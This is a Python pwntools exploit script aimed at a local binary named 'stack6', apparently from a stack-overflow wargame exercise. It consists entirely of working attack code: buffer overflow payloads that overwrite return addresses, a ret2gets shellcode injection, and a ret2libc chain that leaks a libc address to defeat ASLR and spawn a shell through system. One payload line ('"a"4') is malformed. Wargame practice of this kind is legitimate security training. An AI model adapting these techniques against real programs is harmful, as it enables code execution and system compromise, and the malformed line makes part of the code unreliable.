from pwn import *
r = process("./stack6")

raw_input("Debug?")

def getpath():
	retadd = 0xbf000000
	payload = "a"*(0x68-0x1c+4)
	payload += p32(retadd) #ret addr
	r.sendline(payload)
	r.interactive()

def shell():
	get_plt = 0x8048380
	addrshell = 0x8049000
	shellcode = asm(shellcraft.sh())
	payload = "a"*(0x68-0x1c)
	payload += "a"4 #ebp
	payload += p32(get_plt) #ret addr 1
	payload += p32(addrshell) #ret add 2
	payload += p32(addrshell) #arg

	r.sendline(payload)
	r.sendline(shellcode)

	r.interactive()
	
def shell_aslr():
	print_plt = 0x80483c0
	get_got = 0x80496fc
	main = 0x080484FA
	offset_gets = 0x5F3E0
	offset_system = 0x3ada0
	offset_sh = 0xe5f2+5
	
	payload = "a" *(0x68-0x1c)
	payload += "a"*4 #ebp
	payload += p32(print_plt) #ret addr 1
	payload += p32(main) #ret addr 2
	payload += p32(get_got) #arg
	r.sendline(payload)
	
	s = "\x0a"
	r.recvuntil(s)
	res = r.recv(4)
	gets = u32(res)
	print hex(gets)
	
	libc = gets - offset_gets
	system = libc + offset_system
	sh = libc + offset_sh
	
	log.info("gets: %#x" % gets)
	log.info("libc: %#x" % libc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)
	
	payload = "a" *(0x68-0x1c)
	payload += "a"*4 #ebp
	payload += p32(system) #ret add 1
	payload += p32(main) #ret add 2
	payload += p32(sh) #shell
	r.sendline(payload)
	r.interactive()	

# getpath()
shell_aslr()
# shell()
